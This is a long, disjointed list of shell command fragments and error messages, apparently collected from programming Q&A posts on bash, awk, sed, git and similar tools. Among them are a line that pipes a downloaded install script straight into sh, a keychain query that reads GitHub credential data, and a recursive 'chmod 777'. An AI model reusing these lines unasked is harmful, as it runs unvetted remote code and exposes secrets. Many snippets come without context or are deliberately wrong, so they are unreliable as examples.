stat -c '%s'
stat -c '%s'
du -b
find ... | while read filename
for filename in *.jpg
-u 3
man bash
cat -A
man cat
cat -A
[ [^>^] | [}\n*^]]
awk | sort | cut
perl -ne 'print length($_)." $_"' file | sort -n | cut -d ' ' -f 2-
:set fileformat=unix
:set all
require 'config/environment'
{} \;
{} +
-shave N
set -- word
s() { c=$1; while (( c-- )); do echo 'x'; done }
html2text.py [(filename|url) [encoding]]
FILES= /home/stef/test/*
./append.sh: line 4: /home/stef/test/test2.txt: Permission denied.
FOO= *
for ... do; done
echo $1 > log.txt
xargs: .: Permission denied
. file
. './foo';
"Some variable has value abc.123"
 
${A% *}
 *
${A%% *}
 *
${A#* }
* 
${A##* }
* 
[^ ]
[^ ]
[ \t]
sed "s/$argv[1]/\\\\./g"
cd DATA
; exit
read -sn 1
/home/user/topleveldir/{machine1}\ dir/
/home/user/topleveldir/{machine2}\ dir/
sed -E
mkdir ~/projects
adduser --system --shell /bin/sh --comment 'gitolite' --create-home --home-dir /home/git git
adduser: unrecognized option '--system'
chmod a+x replace.sh
-i ''
case $- in *i*
if tty > /dev/null
if [ -t 0 ]
while [ "${\(\#\)}" -gt 0 ] ; do
./while-num 18173.msg 18179.msg 18201.msg
while[ $# -gt 0 ] ; do
s/^/word /
man 1 ed
print $4
these two directories
files or not
continue and execute my other shell scripts
wait for half an hour
if condition is true
every half an hour
if condition is true or not
SunOS 5.1
Hello new11
SunOS 5.1
sleep 1800
while ! COMMAND; do
hadoop fs -ls /DIR
[ ]
hadoop fs -ls
./test.sh --cron
echo "Wrong: res=>$res<"
wc -l
echo "$var"
echo $var
grep -i error data
set +m; shopt -s lastpipe
GNU sed
GNU sed
[ $foldername -lt "yyyy-mm-jj" ]
ls -R | grep ':$'
find . -print
dd if=/dev/bus/usb/001/003 of=~/images.img
find <DIR> -newermt '<DATE1>' \! -newermt '<DATE2>'
find <DIR> -newer <your ref file > \! -newer <your ref file 2>
=~ "\[[A-Za-z0-9]+\]"
var foo = foo.bar()
awk -v awkvariable="$shellvariable"
/[remi]/,/^ *[/
if [ -n ]
< <(command)
for i in file/*.txt;  do mkdir dir;  awk -f script.awk "$i" >> dir/out; done
for i in file/*.txt;  do mkdir anything;  awk -f script.awk "$i" >> anything/out; done
This is the file - w37.csv
"This\ is\ the\ file - w*.csv"
wc -l
grep <anything> -c
wc -l
"abcd4yyyy" | grep 4 -c
man bash
...| awk '{print $5"\t\t" $3"\t"$4}'
sudo apt-get install inotify-tools
hello from
wc -l
teamocil <tab>
. ~/bin/completion/bash_completion_flist
complete -o ...
cat > myfile.txt
man rename
echo $text
ruby -e 'print ENV["text"]'
lsof -p < pid >
-d "^txt"
lsof -p
lsof -p $(your grep | tr '\012' ,)
xargs -L1 lsof -p
lsof -c
bash script
for i in *
for i in $(find <root> -type d -maxdepth 1)
cat file1 | ./my_prog
watch -n3 'grep "\] " server_logs/server_log_09_18_12.txt | tail -n15'
ip route get
ping -I tap0  <ip real IF>
ls -l
ha ha
ll -t "ha ha"
ls -l "-t" "ha ha"
command ls -l "$@"
ls -l "$@"
ll -t "ha ha"
<class name="replace_after_this_string">randomtext</class>
Simple Commands
Lists of Commands
Parameter Expansion
Word Splitting
fg %1
kill 9324
man ssh
/bin/jlogin -c exit "$value"
grep Error >>test
sed -e 's/\([0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+\).*$/\1/' /var/log/messages
GNU awk
nohup /etc/scripts/log start 0<&- 1>> /var/log/LOG 2>&1 &
dig +trace -x
bash -x digdug
while TEST; do CMD; done < file
< <(cmd)
Node bla is Up
Node bla is Down
cut -c1 -z
tr -d '\0'
tr -d '\n'
\! -name "old_*"
-amin -10
GNU awk
sleep 20
progreSh 82
git find all unpushed commits in all projects in this directory
git cherry
git status-all
git status
git pull
git push
git cherry
git log
$ redis-cli KEYS session.* > keys.txt
sed -f editscript
GNU awk
tail -1
{print $9}
print $9
set +e
set -e
set -e
ps u
./mybin && echo "OK"
./mybin || echo "fail"
./mybin && echo ok || echo fail
GNU coreutils
blkid $1 | grep -o -E "[a-f0-9-]{8}([a-f0-9-]{4}){3}[a-f0-9-]{12}"
Total file size
Total transferred file size
rsync --stats -h /your /paths --and --options
man printf
info coreutils printf
FS=": "
ssh-keygen -t rsa
enter passphrase
enter passphrase again
Overwrite (y/n): 
enter passphrase again
cat ~/.ssh/id_rsa.pub | ssh root@host 'cat >> .ssh/authorized_keys'
exec 3>log
{ echo stdout ; echo stderr >&2 ; }
ls /tmp doesnotexist
tee -a log
exec 3>&-
exec 2> >(tee -a output_file >&2) 1> >(tee -a output_file)
cat /tmp/id_rsa.pub
bash: cat /tmp/id_rsa.pub: no such file or directory
cat /tmp/id_rsa.pub
bash: which java: command not found
for (cust in purchased)
for (cust in shown)
(( == ))
ls -t
$ find . -type f -printf '%s %p\n'|sort -nr|head
$ find . -maxdepth 1 -printf '%s %p\n'|sort -nr|head
$ du -a . | sort -nr | head
du -aS /PATH/TO/folder | sort -rn | head -2 | tail -1
du -aS /PATH/TO/folder | sort -rn | awk 'NR==2'
if($1 > 500000)
head -n 1
ls -S
8445 examples.desktop
find . -type f -exec ls -al {} \; | sort -nr -k5 | head -n 25
find . -type f -exec ls -alh {} \; | sort -hr -k5 | head -n 25
sort -nr
ls -sh
ls -shS /pathFolder | head -n 1
head -n 2
ls sort head
find /path/to/dir -type f -exec du -h '{}' + | sort -hr | head -10
M-x server-start
emacsclient -n filename
-c, --create-frame
M-x server-start
emacsclient -e '(kill-emacs)'
ifconfig | grep 'inet addr:' | awk {'print $2'} | awk 'BEGIN{FS=":"}{print $2}' | grep -v '127.0.0.1'
ip -4
ip a | awk ' !/[0-9]+\: lo/ && /^[0-9]\:/ || /inet / && !/127\.0\.0\.1/ {print $2}'
ip a | awk ' !/[0-9]+\: lo/ && /^[0-9]\:/ || /inet / && !/127\.0\.0\.1/ {print $2}' | perl -i -pe "s/:\n/: /g;" -pe "s/\/[\d]+$//"
eth0: 192.168.0.1
grep -v
' [rtw] '
GNU awk
wc -l < log.txt
cat /etc/*release
info bash
<<<$(echo -e "$wd1\t$wd2\n\n")
$' ... '
pr -tn
cat -n xyz.c > xyz.prn
cat -n
export JAVA_OPTS="... \"-XX:OnError=$TEMP_CMD\" ..."
export JAVA_OPTS='... "-XX:OnError=$TEMP_CMD" ...'
xterm | cd /home/tirengarfio/Music
xterm -e /usr/bin/bash -c "cd /home/tirengarfio/Music"
tr '\n' ' '
GNU awk
awk '{print $12 $13 $14 $15 $16}'
awk '{print $12-through-end-of-line}'
grep -f
sort -u
grep -f
GNU awk
GNU awk
find . -type f \! -path \*/\.svn/\*;
git status
svn status
#!/usr/bin/env perl
use warnings;
awk -F ":" '{print $value_of_field_to_print}' /path_of_file_containing_fields
-F fs
ls --color=auto
pkill lxsession;
"iwlist NIC scan | grep ESSID | awk '{print $1}'"
"iwlist NIC scan | grep level | awk '{print $3}'"
iwlist NIC scan
awk: program limit exceeded: maximum number of fields size=32767
export fileData
od -tu4
chmod a+x hex2bin.awk
man printf
man bash
find /opt/logs/qnap -type f -mtime +180 -delete
-type f
find /opt/logs/qnap -mtime +180 -delete
ls -R
cd /some/path
rm somefile
mkdir somedir
rmdir somedir
kill -9
port select
sudo port select --set python python27
port select
sudo port select --set python python25-apple
port select
port select
port select pip
port select pip
xscreensaver-command -watch
xscreensaver-command -time
Monitor is Off
Monitor is On
if [ $(tail -1 /path/to/gdscript.log)  == "Process Complete" ]; then
rm .noseids
./manage.py test
grep v2.5.1
man env
myscript SomeText
myscript "Text1 Text2"
StrinBuffer APPEND()
git index-filter
Warning: post-commit hook failed (exit code 1) with output:
"Everything OK. Checking if publishing dir was changed." >&0
osascript -e 'tell app "Finder" to display dialog "Text goes here. Please select OK or Snooze" buttons {"OK", "Snooze"} default button 1 with title "Text Here" with icon caution'
"button returned:OK"
adb uninstall projects.abd.def
600 100
$1 == bin_num
pad_timestep = sprintf("%06d", timestep);
chmod +x /path/to/hook
-e '/[^"]$/N'
-e 's/\n//g'
GNU awk
nohup php -r 'while (true) { echo "a";}' &
kill -9 {PID}
./script.sh /path/to/a\ folder/
cd: /path/to/a: File or folder not found
./script.sh "/path/to/a\ folder/"
cd: /path/to/a\: File or folder not found
cd $instdir
cd "$instdir"
a folder
echo $CMD
set -x
set +x
j=`expr $j + 1`
ftp -n ${4} << EOF
dpkg-reconfigure -f noninteractive
read: 'site|database': not a valid identifier
OS X
readline 1.*
func == rl_insert
git mv
git mv
GNU awk
< script ..... >
jobs -p
ps -u
GNU bash, Version 4.1.7(2)-release (i386-apple-darwin10.4.0)
1 hour
stat -c %y reference_file
date -d "[...] + 1 hour"
find . -newermt "[...]"
root null
if [[ ! -z $var ]]
-z ${parameter:+word}
col -b
col -b
rename 2010.306.18.08.11.0000.BO. "" *
rename .. _. *
rename 2010.306.18.*.*.*.*. ""
rename 2010.306.18.*.*.*.*. "" *
find . ! -name "*.xml" -type f
find . -type f -name "*.xml" -o -type f -print
awk -F '[' ' /NEEDED/ { print $NF } ' file_name | sed 's/]//' | sort | uniq
~/Library/Application Support/Google/Chrome/Default
$echo bookmarks_dir
openssh 5.3p1:81.el6
chmod 2700 -R /var/svn/
tail -fn 2000 /var/log/secure
mesg n
mesg y
No such file or directory: 'test/storage/inputfile.txt'
cred . england England
cred . england 'the United Kingdom'
find $1 -type f
bash: ./hfpage.o: cannot execute binary file
-m32 or -m64
make clean
arithmetic expression
man bash
12: pass=correct
ls -tr1
sed -n '/id/p' filename
grep -o -n 'id' filename
while read
man echo
watch -n 3 timedatectl
rvmsudo siriproxy server
which rvmsudo
git push heroku master
heroku keys:add
ssh-keygen -t rsa
heroku keys:add
echo $((${hashArray[1]} ^ ${hashArray[2]}))
"ID","Company Name","AccountManager","Country"
cat battery.txt
ls /usr/bin/[
man test
[[ expr ]]
printf("%2s", "hello");
GNU grep
ssh target
LogLevel QUIET
Host proxy
ssh -q proxy ...
PS1="$rvm $folder_name $git_branch \$(_git_st) \$ "
$0 = C:\Users\dir\file
wpa-ssid \"$ssid\"/
workon myproject
Set Character Encoding
Windows Terminal
Win 10
sed -n -e "s_\(..\)\(.\)\(..\)\(.\)\(....\)_\5-\3-\1_p"
date --utc --date "2012-12-31" +%s
xset q
xset q
.xset: unable to open display ":0.0"
[[ ! `…` ]]
tr '_' '\n'
find . -type f | wc -l
-type f
find -type f
find -name '*.txt'
VMWare (copy).desktop
xargs -0
file --mime-type <filename>
./prog arg1 arg2
prog arg1 arg2
env | grep PATH
export PATH="/new/directory/path/:$PATH"
setenv PATH "/new/directory/path/:$PATH"
[ -n "$string" ]
grep regex $string
wget -O youtube.html http://youtube.com
grep [0-9].views youtube.html
grep views youtube.html
grep views youtube.html | cut -f1 -d' '
-I %
sh -c '{ command1; command2; ...;}'
sh -c
chage -l
bob -a some_arg (( if we have ${VAR} defined add '-b ${VAR}' as an argument ))
LANG=C man bash | less +/'Parameter Expansion'
-v a1=$0
man bash
rvm --default use 2.4.0 > /dev/null 2>&1
echo '$var'
echo "$var"
ssh test@$192.168.1.35 'echo $var >> /home/test/log.txt'
ssh test@$192.168.1.35 'echo $var' >> /home/test/log.txt
ssh test@$192.168.1.35 "echo $var >> /home/test/log.txt"
"quoting $a"
quoting string
'quoting $a'
quoting $a
ln -s Fonts/ ~/Library/Fonts
ln: /Users/Username/Library/Fonts/: File exists
ln -s ~/Library/Fonts Fonts
ln -s -F
ln -s -h -F /source/folder/to/use /destination/folder/to/overwrite
ln -sTf /source/folder/to/use /destination/folder/to/overwrite
ln -sf -t /destination/folder/to/overwrite/.. /source/folder/to/use
yes ""
more off
--resample 8
man bash
if cat test.in | myprogram | diff - test.out
my-script.sh /path/to/search/for/duplicate/names /target/dir/to/create/combined/files
cp -rv /mnt/a/* /
`/mnt/a/f1` -> `/f1`
man bash
echo $SHELL
alias ll = "ls -lahG"
| cat -
screen -x
xargs -0
kill -l
man 7 signals
gcc -E
Windows Services for UNIX
mvn <params>
/bin/bash script.bat
sudo apt install dosbox
MOUNT D /home/<your user>
for i in foo
GNU awk
GNU grep
(Mismatch Percentage) on * sign
( unexpected
"DIVISOR DIVIDEND ..."
if [ "$day" == "1" ] ||  [ "$a" == "1" ]; then     echo "First day."; fi
--sort pid
--sort +pid
GNU awk
find . -maxdepth 1 -type f
($(find . -maxdepth 1 -type f)
rails server --debugger
vim ~/railsapp
cd ~/railsapp
:help mksession
:mksession /path/to/mysession.vim
$ vim -S /path/to/mysession.vim
vim ~/rails_app
./test.sh | otherprogram
./test.sh | cat
while true; do script; sleep 1; done
). There's no reason to use
info coreutils
chmod -R 777 /your/project/
function printf() { $(which printf) "$@"; }
$(which printf)
printf () { ...; }
echo $F1
top: failed to get tty
crontab -e
Error Percentage
./SyncIPs.cmd 10.0.1.45
/var/www/html/Web Content/largefile.zip
git push
security find-internet-password -s github.com | grep acct | sed 's/"acct"<blob>="//g' | sed 's/"//g'
GNU sed
local i=0
(echo "100*$TEST2/$TEST1" | bc -l)
"ID","Company Name","AccountManager","Country"
$1 $2 ...
export PATH=$PATH:/usr/local/Cellar/nginx/1.12.0/bin
rm *\).ext
md5 *.ext | awk 'some script'
bash: /sbin/md5: Argument list too long
rm *\).txt
man tar
#!/bin/bash -vx
chmod u+x
Command not found
grep -q
cd ..
wget ..
-e "$png"
"$f" -nt "$png"
set -x
set -v
set +x
set -x
set +x
[[ -s "$HOME/.rvm/scripts/rvm" ]] && source "$HOME/.rvm/scripts/rvm" # This loads RVM into a shell session.
rvm default
ln -s ~/.bashrc ~/.bash_profile
/bin/bash --login
$ source $(rvm 1.9.3 do rvm env --path)
$ source $(rvm 2.2.1 do rvm env --path)
> stripped_file
GNU sed
$( cd Backup && pwd )/backup_$(date +%Y%m%d).tar.gz
$( cd Backup && pwd )/backup_$(date +%Y%m%d).tar.gz
man bc
pi = 4*atan(1)
auto floors it to integer
bar is 1234 miliseconds or 1.234 seconds
man find
{ }
for i in {1..50000} ;  do echo $i ; done
for i in {1..50000} ; { do echo $i } ; done
zsh: parse error near
(list; )
COUNT=$(< /tmp/state_file)
if [[ $COUNT ~ ^[0-9]+$ ]]; then blabla; fi
let a=$(($a+0))
declare -i a; a="abcd123"; echo $a # got 0
echo $COUNT | bc
echo ${COUNT/[a-Z]*} | bc
read -e
command; if [ $? == 0 ]; then
if <command>; then
Error messages belong on stderr
if false > /dev/null;then echo 1; else echo 2; fi 2> /dev/null
if true > /dev/null;then echo 1; else echo 2; fi 2> /dev/null
> /dev/null
if echo 123;then echo 1; else echo 2; fi 2> /dev/null
ls dir1/*.txt_dir
wc -l stats.txt
8 stats.txt
x = wc -l stats.txt
$(cat $(ls | head -n 1) | wc -l)
if [[ $username =~ [^0-9A-Za-z]+ ]]
man ping
:!grep "tag1" filename | grep "tag2" filename | grep -n "tag3 or more" filename
sh ...
cmp file file
cmp -s file1 file2
diff file1 file2 > /dev/null
tail -n "+$N" file
head -n 1
val=$(awk -v line=$i 'NR==line{print;exit}' filename)
rm $file 2>&1
FATAL ERROR:
set -- $line;
bash --version
read -p
read -p
10 30 44 44 69 12 11...
cat file | while read
;s/ $//
fgrep -m 1
md5sum -c
sort -k2
join -1 2 -2 2
a | b | c | d
text2wave -mode singing america1.xml -o america1.wav
man dos2unix
Bash On Ubuntu on Windows
Windows 10
sudo apt-get install dos2unix
four results
ls | grep srt$ | xargs -I {} rm {}
head -n
egrep -o ".{50}SIP.{4}"
grep -nE "$(...)" log.txt
head -n 1
sed -ne '/^#/s/.*SIP\/\([0-9]*\)$/\1/p' log.txt
uniq -d
-d '|'
GNU awk
help command
source .bash_rc
head -1 file.txt
head -1 file.txt
grep firefox
head -1 file.txt | grep firefox
host= i686-apple
/bin/sh -c
(( ... ))
( command )
[ FAILED ]
daemon $PUPPETMASTER $PUPPETMASTER_OPTS --masterport=${PUPPETMASTER_PORTS[$i]} --pidfile=/var/run/puppet/puppetmaster.${PUPPETMASTER_PORTS[$i]}.pid
strace -f puppetmasterd 2>&1 | grep '\.pid'
Usage: daemon [+/-nicelevel] {program}
daemon --pidfile=/var/run/puppet/puppetmaster.${PUPPETMASTER_PORTS[$i]}.pid $PUPPETMASTER $PUPPETMASTER_OPTS --masterport=${PUPPETMASTER_PORTS[$i]}
man 1 printf
column -t
" "
sh tremor_script.sh
which sh
awk -f 3-para.awk 3-para.data
tricolor 3-para.data
date +%b_%d_%Y_%H_%M_%S
date +%s
data1=x data2=y data3=x datakey
echo -n
GNU sed
tr ',' '\t' <input>temp1
-tvf 4.tar | awk '{print $6}' | cut -d'/' -f 1
my_script pack name.tar file1 file2
SET SERVEROUTPUT ON
SERVEROUTPUT ON FORMAT WRAPPED
... TRUNCATED
l_pos NUMBER := 1
ruby -v
ruby -v
/bin/bash --login
which ruby
rvm info
which bash
rvm requirements
tail -f
tail -f
watch -n 1 cat myfile.txt
 { picture: { path : "thePath", pixelWidth: 1600, pixelHeight: 1050, filename : "name" }}
perl scr.pl | plutil -convert binary1 -o yourfile.plist -
perl scr.pl
[NSDictionary dictionaryWithContentsOfFile:pathToYourFilePlist]
LF_ALERT_TO = ""
[ \t]*
LF_ALERT_TO = "e.mail@here.com"
sed -i "..." csf.conf will change the original file.
chmod +x
rm -f
wget http://sitehere.com/install.sh -O - | sh
> /var/log/daemon.log 2>&1
man start-stop-daemon
"whoami &2>/dev/null"
"id -un &2>/dev/null"
"$(whoami &2>/dev/null)"
"$(id -un &2>/dev/null)"
while true; do ./my_script.bash; sleep 60; done
man ssh
ssh root@your-host
who am i
inet addr
"/bin/ls" arf
"\"/bin/ls\" arf"
3 users
echo $(date) $(who | awk '{print $1}' | wc -l) users >> log.txt
echo $(date) $(who | awk '{print $1}' | uniq | wc -l) users >> log.txt
echo | sudo tee -a
sudo bash -c 'echo >>'
ls -a ``echo $PATH | sed "s/:/ /g"`` 2> /dev/null
${PATH//:/* /}
printf '%s\n'
/bin/ls -1
head -5
echo $VAR
$( ... )
git show
git checkout
git add foo
git branch
man git
echo "$line" |
GNU awk
GNU awk
for i in $( ls $folder ); do echo $i; done
cat file_chunk >> test.mp4
cat ...
auto lo
iface lo inet loopback
file not found
set -e
man 1 test
:set spell
OS X
brew info aspell
aspell check
aspell list
personal_ws-1.1 en
-type f
-name "*.txt"
-exec aspell check {} \;
print 4*2
which sleep
bash -x
xt *HNAZXLCOM*
-n 13
H=$(ls -t *HNAZXLCOM* | head -n 1)
bash -c
GNU awk
Static final String line = "test";
grep -Ev -f
sort | uniq
-m 1
grep Start_t $job_template | awk -F= '{print $2}'
awk -F= '/Start_t/{print $2}' $job_template
command | awk '{ print $1; }' | while read val ; do
cat test.txt
date +%S
date +%N
date +%s%n
date +%s%N
set -- $str
set -- "$str"
eval set -- "$str"
VAR1=some text here
VAR="foo bar"
man bash
read f
w | wc -l
w|wc -l
head -1
Preferences > Settings > Keybaord
cat file > file
jpegtran -optimize -progressive -scans script_new.txt -outfile progressive.jpg original.jpg
GNU awk
sed '/^$/d'
sed 'N; s:\n:\t\t:; N; s:\n:\t\t:'
gs -sDEVICE=bbox
GNU sed
man vim
vim +command
test 3 -lt 6
((   ))
[[ ]]
man test
man bash
help test
sort -u
| sort -n
man launchd
man launchd.plist
for x in cli supplicant passphrase event; do cp -v wpa_$$x /usr/local/bin/; done
git mergetool
Hi how are you
declare -A
exit 1
exit $?
Shell Builtin Commands
[[ $count -le 100]]
time sh -c
-1 1
-2 1
-N 1
tmux -C
tmux -C
ls -1
t="echo do do do; echo da da da"
do do do; echo da da da
eval $t
do do do
da da da
ls | grep -v '\.' |file -f -
file *
ls | grep -v '\.' |file -f -
file -
ls | grep -v '\.' |file -f - |grep -i jpeg
echo $basename $1
cp $1/. $2
cp $1/* $2
cd ././././././././
ls /bin/[
man test
locale -va
man locale
man 7 locale
while true
while :
while true
man curl(1)
sed G
sed -n 1~2p
a: let: r=*: syntax error: operand expected (error token is "*")
cmp "$file1" "$file2"
cmp -- "$var1" "$var2"
cmp ./"$var1" ./"$var2"
GNU sort
GNU awk
GNU sed
sort -u
sed -r '[a-z]{3}'
sed '[a-z]\{3\}'
man egrep
ps -df
ps -df
bash script
exit 1
touch blah
mkdir blah
export PERL5LIB=$(echo blabla)
echo 'NEWSTRING' | tr '[:upper:]' '[:lower:]' | sed 's/foo/(my tr output in lowercase)/g' file.txt
xeyes &
set -e ; set -x
set -e
chmod +x script.sh
which s3cmd
groups username
vfclists : vfclists adm dialout cdrom plugdev lpadmin sambashare admin
$(( value / 1000 ))
LC_ALL=C stat logfile.log  | grep '^Modify' | cut -d: -f2-
date "+%s" --date="$(LC_ALL=C stat logfile.log  | grep '^Modify' | cut -d: -f2-)"
? ls
error: limits.h: No such file or directory
rvm requirements
{ ... }
sed -i "s,SYNFLOOD_RATE  = \"100/s\",SYNFLOOD_RATE  = \"10\s\",g"
file -bi | cut -d ';' -f 1
File 2
set -o errexit
-C <path>
-C <path>
-C <path>
-C ""
GNU sed
$(echo $src)
trailing=${value##*[! ]}
grep "have .* &&" /etc/bash_completion.d/*
man bash
echo "Hello" | $RUN_WITH_VALGRIND ./c_program
man mkfifo
uniq -c file.txt | awk '{print}END{print NR}'
find -type f
sudo updatedb
crontab -e
while read
nm -A
nm -R
cat input-one
<( ... )
cat <( echo foo )
cat /dev/fd/64
echo foo
echo foo
echo -e
echo -n
12.3457 3.14159 543210000000000000
sed 's/[eE]+*/*10^/g' <<< '7.11e-2 + 323e+34'
sed 's/[eE]+*/*10^/g' <<< '7.11e-2 + 323e+34' | bc -l
7.11*10^-2 + 323*10^34
printf '%.<precision>f'
gawk --version
GNU MPFR
GNU MP
printf '%f'
NF = NF -1
wc -l
./script.sh file.txt
make yu.o
setopt rcquotes
find /tmp/foo /tmp/bar -print -quit
man locate
locate experiment | head -3
locate -r 'experimental..$'
cat input.txt |awk -F"=" '{print $2}' |sort -u > data_key
CXX=g++ CUSTOM_VERSION=2.5 command
sed 's/.*\///'
words != ""
while(scanf("%s", words) == 1)
< words
> out
sign < words | @sort > out
char words[80];
&words[0] == &""[0]
awk '/"id":/ { exit 42 }'
bash --version
GNU awk
GNU awk
{print $0}
icount[$1] == ocount[$1]
while (<>)
ls -v *.csv
O(n log(n))
n log(n) ~ 10^10
rvm gemset
PS1="\$(~/.rvm/bin/rvm-prompt) $PS1"
rvm gemset
John-MacBook-Air:~ john
PS1=something ; export PS1
echo TEST
touch /tmp/test
{ "foo": "bar" }
{ foo: "bar" }
sed -r 's/("{1})(\w+)(":{1})/\2:/g' in.js > out.js
sed -ri 's/("{1})(\w+)(":{1})/\2:/g' in-and-out.js
rm -f
man rm
grep -c
grep -q
my_sed "s/foo/bar" /tmp/somefile.txt
echo 123 | my_sed 's/foo/bar'
grep -Rni "do_action( 'init'" *
:help starstar
:tag do_action
:help tags
:!cscope -bR *.php
:cs add cscope.out
:cs f d do_action
cmd1 && cmd2 && cmd3
-names *
sed -i
$echo which wget | sudo mv git-credential-osxkeychain
set -vx
$echo which wget | sudo mv git-credential-osxkeychain
which git
[ -z "$str" ]
[ -n "$str"]
screen -dmS nameofscreen command
screen -dmS screen1 echo test && ls -al
(screen -dmS screen1 echo test) && (ls -al)
screen -dmS screen1 (echo test && ls -al)
screen -wipe
screen -wipe
script1 at 3 AM, script2 at 3AM, script3 at 3AM
<!--?php shell_exec("/opt/bin/echkchunk -a"); ?-->
help jobs
awk 'BEGIN{s=0;}{s=s+$2;}END{print s/NR;}' file
man bc
$ 
for line in `cat $DATAFILE` 
sed -i '' -e '$a\' file
-i ''
while ...;do something;done<file
cd $i
pushd "$i"
for dir in */
(echo createmvp; cat /dev/tty) | src/protected/yiic shell src/index.php
<<< createmvp < /dev/tty
rsync -Pravdtze ssh
"$a"="$a "
"$a=$a "
ls -l
help test
bash test
man bash | less +/'\[\[ expression'
POSIX shell
help [
if condition; then action; fi
set                 -g status-right ' #[bg=colour33] Branch #[(git branch)] '
/usr/bin/zarafa-dagent someuser -f tmp new cur
/home/user/git/proyect/test ./myScript
man curl
for i in $(seq 0 $k)
The"quick brown"fox"jumps over"the"lazy dog."
GNU awk
shopt -s huponexit
./yourScript.sh   > >(tee stdout.log) 2> >(tee stderr.log >&2)
xargs -0
read -n 1
a b c
bash -x
set -x
compgen -f f
foo faz/
foo faz
-o default
complete -o default -F _my_completion
-o default
compopt +o default
compopt -o default; COMPREPLY=()
compopt -o nospace
compgen -f
compgen -d
-S /
grep -f file1 file2
-P ^
-S '$'
-o nospace
-o filenames
info -n "(bash)Programmable Completion Builtins"
chmod 700 run.sh
exit {value}
exit 0
exit 1
GITBRANCH=git symbolic-ref HEAD | cut -d/ -f3-
ssh remotehost
<( )
<( )
set -v
> out1.txt
cat > out2.txt
< in2.txt
cat < in1.txt
man bash
cat < in1.txt < in2.txt
cat < in2.txt
< in1.txt
cat in.txt > out1.txt > out2.txt
> out1.txt
./tocsv.sh dataserver.txt > dataserver.csv
temp="$file"|cut -d'/' -f3
echo value | command
"2>&1 > /dev/null"
exec >/dev/null 2>&1
[[ "$IS_VERBOSE" ]]
( ... )
2>&1 > /dev/null
> /dev/null 2>&1
[ $u!="root"]
bash -x
set -x
bash -x script.sh
set -x
echo on
set +x
set -x
filename not matched:  '*PSU*'
softlimit -m 1048576 nautilus
find . -type d -exec bash -c 'mv "$1" "${1//foo/Bar}"' -- {} \;
mkdir -p foo/foo/foo
$(elb-describe-instance-health | awk '/INSTANCE_ID/{print $2}')
i-111 i-222 i-3333
(( $var == 3 ))
(( $var = 3 ))
(( var = 3 ))
man time
help time
[ ]
[[ ]]
(num1 > num2) && (num1 < num3)
$( )
$( )
mount -t luks
mount -t luks /dev/hda /mnt/decrypted
umount /dev/hda
umount /mnt/decrypted
umount /mnt/decrypted
mount -n
mount -f
'-o helper=luks'
wget -r --follow-tags=ref,a http://rocky:8081/obix/
GNU sed
xyz load aab\1.0.5
module load program
module load program/2.3.3
module appname avail
module firefox avail >> result.text
tail -f LOGFILE | grep KEYWORD
tail -f
( )
"ID": "
"newId": "
tr '\r\n' ' ' <file1.txt >file2.txt
' '
(links|links2|lynx|w3m) -dump
UNEXPECTED END OF FILE
1 2
2 1
_site_url: http://statamic.com
_site_url: http://example.com
./scriptname file > newfile
scriptname file_to_process > output_file
./scriptname file > newfile
${var:?error message}
man at
load data infile
insert into table...
load data infile
LOAD DATA LOCAL INFILE
LOAD DATA INFILE
find . -regex '.*\.\([chCH]\|cc\|CC\)'
find . -name '*.[cCHh][cC]?$'
kill -9 pidnumber
sudo kill -9 pid
bash cmp.sh garbage rubbish
cd today
service my-foobar-daemon start / stop
sed -i 's/${inputdirs[$((izbor-1))]}/$novi/g' .backup.conf
inputdirs=(/etc/perl /etc/apm /usr/local)
[^ ]*
[^ ][^ ]*
[^ ]+
/path/to/script foo bar
set -- $args
unterminated address regex
-f -
sed: -: No such file or directory
die foo
Error foo
declare -p quotedarray
declare -p quotedarray
quoting is lost on this pass
" "
stdout and stderr
stderr and stdout
fd 3
output=$(command 2>&1 >/dev/tty)
exec 3>&1
exec 3>&-
export PATH=/bin
export PATH=/bin:/sbin
/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin:/usr/X11/bin:/usr/local/git/bin:/u‌sr/local/mysql/bin: No such file or directory
find /path/to/dir -name "filename" | wc -l
if [ '' ]
chmod +x script.sh
sh script.sh
nc - lk <port>
basename $PWD
-prune -o
-bash: ./foo.sh: Permission denied
sudo ./foo.sh
sudo: foo.sh: command not found
chmod +x foo.sh
sudo pwd
man chmod
info chmod
chmod u+x foo.sh
chmod +x foo.sh
sudo: command not found
apt-get install sudo
yum install sudo
Allow executing file as program
. myscript
ssh -A -t user@work ssh -A user@hostname
my_notify longrunning_command...
ln -s
NEW=$(ls $TMPDIR)
" mpg.tmp"
" mpg.tmp"
var=$(ls ...)
mv $OUTDIR/$OLD $OUTDIR/$NEW
whereis java
java -version
java -version
sudo mv Current Current.1.7
sudo mv Current.1.6 Current
system("echo \"lump = \" >> ./newdirectory/newfile.c");
system("echo \"system(\"echo hello world\");\" >> ./newdirectory/newfile.c");
system(echo hello world);
./test.sh: line 13: [: 29: integer expression expected
[ "$DATE" = "$LASTSAT" ]
LASTSAT=$(cal|awk '{if(NF==7){SAT=$7}};END{print SAT}')
man date
awk -f script.awk file.txt
echo "$x"
echo $SHELL
echo.sh "test best"
test best
var="hello world"
perl my_script.pl
chmod u+x my_script.pl
/parameter a/{FLAG=1}
END{if(flag==0){for(i=1;i<=NR;i++){print}print "adding parameter#\nparameter A#"}}
SomeParameter B
Resource temporarily unavailable
set -e
exit 42
xcodebuild clean
cat -n A.tsv > A-id.tsv
cat -n B.tsv
cat A.tsv B.tsv C.tsv | cat -n > ABC.tsv
cat A.tsv B.tsv C.tsv | nl > ABC.tsv
cat A.tsv B.tsv C.tsv | grep -n '^' > ABC.tsv
awk '{outfile=FILENAME; sub(".tsv", "-id.tsv", outfile); printf("%6d  %s\n", NR, $0) >outfile;}' A.tsv B.tsv C.tsv
awk 'FNR==1 {outfile=FILENAME; sub(".tsv", "-id.tsv", outfile);} {printf("%6d %s\n", NR, $0) >outfile;}' A.tsv B.tsv C.tsv
"Albert Smith"
tail -n  /home/rent_list
"for reading (no such a file or directory)"
make -B
'[A-Z][^ ]*'
grep '[A-Z][a-z]\{8\}'
grep -E
chmod 777
shell_exec('which osascript');
last $num_int
mkdir -p
BR*.* W0*.*
prev!=$2 {first=0;prev=$2}
GNU sed
sed -e 's/bizzbuzz\([0-9][0-9]\)//g' file.txt
if condition; then something; else something_else; fi
A = B
A = C
B = C
tr A-Z a-z < infile > outfile
blah blah | grep $var2
grep -q
exec $realcmd "$@"
GNU awk
cd /usr/bin
$ source a.sh
change dir
set -e
sort -u
sort -u
echo "server { ... }" >> nginx.conf
export PATH
